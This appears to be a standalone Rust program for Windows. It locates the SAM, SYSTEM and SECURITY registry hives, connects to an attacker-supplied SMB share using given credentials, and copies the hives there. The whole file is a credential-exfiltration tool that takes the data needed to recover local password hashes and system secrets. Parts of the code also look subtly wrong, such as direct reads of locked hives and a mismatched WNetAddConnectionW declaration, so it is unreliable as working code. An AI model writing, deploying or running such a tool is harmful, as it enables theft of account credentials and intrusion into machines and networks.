use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null;
use std::path::Path;
use std::fs;
use std::io;
use windows_sys::Win32::Foundation::{GENERIC_READ, GENERIC_WRITE, GetLastError, CloseHandle};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, OPEN_EXISTING, FILE_SHARE_READ, CREATE_ALWAYS, WriteFile,
};
use windows_sys::Win32::System::SystemInformation::GetSystemWindowsDirectoryW;

const NO_ERROR: u32 = 0;

fn main() {
    let args: Vec<String> = env::args().collect();

    // Expect: program_name smb_path username password
    if args.len() != 4 {
        std::process::exit(6); // Invalid arguments
    }

    let smb_path = &args[1];
    let username = &args[2];
    let password = &args[3];

    // Step 1: Locate hive files
    let hives = match locate_hives() {
        Ok(h) => h,
        Err(code) => std::process::exit(code),
    };

    // Step 2: Connect to SMB
    match connect_smb(smb_path, username, password) {
        Ok(_) => {},
        Err(code) => std::process::exit(code),
    }

    // Step 3: Transfer hives
    match transfer_hives(smb_path, &hives) {
        Ok(_) => {},
        Err(code) => std::process::exit(code),
    }

    // Success
    std::process::exit(0);
}

fn read_hive_file(path: &str) -> Result<Vec<u8>, i32> {
    match fs::read(path) {
        Ok(data) => Ok(data),
        Err(e) => {
            match e.kind() {
                io::ErrorKind::NotFound => Err(1),           // File not found
                io::ErrorKind::PermissionDenied => Err(2),   // Access denied
                _ => Err(6),                                  // Other errors
            }
        }
    }
}

fn locate_hives() -> Result<[String; 3], i32> {
    // Get system directory
    let sys_dir = match get_system_directory() {
        Ok(dir) => dir,
        Err(code) => return Err(code),
    };

    let config_dir = format!("{}\\config", sys_dir);
    let hives = [
        format!("{}\\SAM", config_dir),
        format!("{}\\SYSTEM", config_dir),
        format!("{}\\SECURITY", config_dir),
    ];

    // Verify all three exist by attempting to open each
    for hive_path in &hives {
        if !Path::new(hive_path).exists() {
            return Err(1); // File not found
        }
    }

    Ok(hives)
}

fn get_system_directory() -> Result<String, i32> {
    let mut buffer = vec![0u16; 260];
    let len = unsafe {
        GetSystemWindowsDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32)
    };

    if len == 0 {
        return Err(6); // Unexpected error
    }

    buffer.truncate(len as usize);
    Ok(String::from_utf16_lossy(&buffer).to_string())
}

fn connect_smb(path: &str, username: &str, password: &str) -> Result<(), i32> {
    let wide_path: Vec<u16> = OsStr::new(path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let wide_user: Vec<u16> = OsStr::new(username)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let wide_pass: Vec<u16> = OsStr::new(password)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let result = unsafe {
        WNetAddConnectionW(
            wide_path.as_ptr(),
            wide_pass.as_ptr(),
            wide_user.as_ptr(),
            0, // dwFlags: 0 for no special options
        )
    };

    match result {
        NO_ERROR => Ok(()),
        1326 => Err(3), // ERROR_LOGON_FAILURE — auth failed
        1231 => Err(6), // Not a standard SMB path error
        _ => Err(6),    // Other errors
    }
}

fn transfer_hives(smb_path: &str, hives: &[String; 3]) -> Result<(), i32> {
    let hive_names = ["SAM", "SYSTEM", "SECURITY"];

    for (i, hive_path) in hives.iter().enumerate() {
        let data = read_hive_file(hive_path)?;
        let filename = format!("{}.bin", hive_names[i]);
        write_to_smb(smb_path, &filename, &data)?;
    }

    Ok(())
}

fn write_to_smb(smb_path: &str, filename: &str, data: &[u8]) -> Result<(), i32> {
    let full_path = format!("{}\\{}", smb_path, filename);

    let wide_path: Vec<u16> = OsStr::new(&full_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let file_handle = unsafe {
        CreateFileW(
            wide_path.as_ptr(),
            GENERIC_WRITE,
            0, // No sharing
            null(),
            CREATE_ALWAYS, // Overwrite if exists
            0,
            0,
        )
    };

    if file_handle == -1 {
        let error = unsafe { GetLastError() };
        return match error {
            5 => Err(2),    // Access denied
            112 => Err(5),  // Not enough space
            _ => Err(6),    // Other errors
        };
    }

    // Write data
    let mut bytes_written = 0u32;
    let write_result = unsafe {
        WriteFile(
            file_handle,
            data.as_ptr(),
            data.len() as u32,
            &mut bytes_written,
            std::ptr::null_mut(),
        )
    };

    unsafe {
        CloseHandle(file_handle);
    }

    if write_result == 0 || bytes_written as usize != data.len() {
        return Err(5); // Write failed
    }

    Ok(())
}

unsafe extern "system" {
    fn WNetAddConnectionW(
        lpRemoteName: *const u16,
        lpPassword: *const u16,
        lpUserName: *const u16,
        dwFlags: u32,
    ) -> u32;
}
